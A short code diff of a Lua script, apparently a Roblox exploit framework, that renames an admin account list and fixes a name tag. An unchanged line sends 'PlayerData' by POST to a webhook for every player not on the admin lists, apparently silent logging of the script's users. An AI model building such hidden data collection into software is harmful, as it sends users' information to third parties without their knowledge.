@@ -145,7 +145,7 @@ local framework = {
     if framework.admin_accounts.azoozAccounts[game.Players.LocalPlayer.UserId] then
     elseif framework.admin_accounts.smail_accounts[game.Players.LocalPlayer.UserId] then
     elseif framework.admin_accounts.max_accounts[game.Players.LocalPlayer.UserId] then
-    elseif framework.admin_accounts.raven_accounts[game.Players.LocalPlayer.UserId] then
+    elseif framework.admin_accounts.eden_accounts[game.Players.LocalPlayer.UserId] then
     else
         HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
     end
@@ -2153,7 +2153,7 @@ local framework = {
           createNameTag(plr.Name, "Azooz")
             elseif framework.admin_accounts.eden_accounts[plr.UserId] then
                 framework:sendNotification("Eden has joined your server")
-          createNameTag(plr.Name, "Smail")
+          createNameTag(plr.Name, "Eden")
             elseif framework.admin_accounts.smail_accounts[plr.UserId] then
                 framework:sendNotification("Smail has joined your server")
           createNameTag(plr.Name, "Smail")
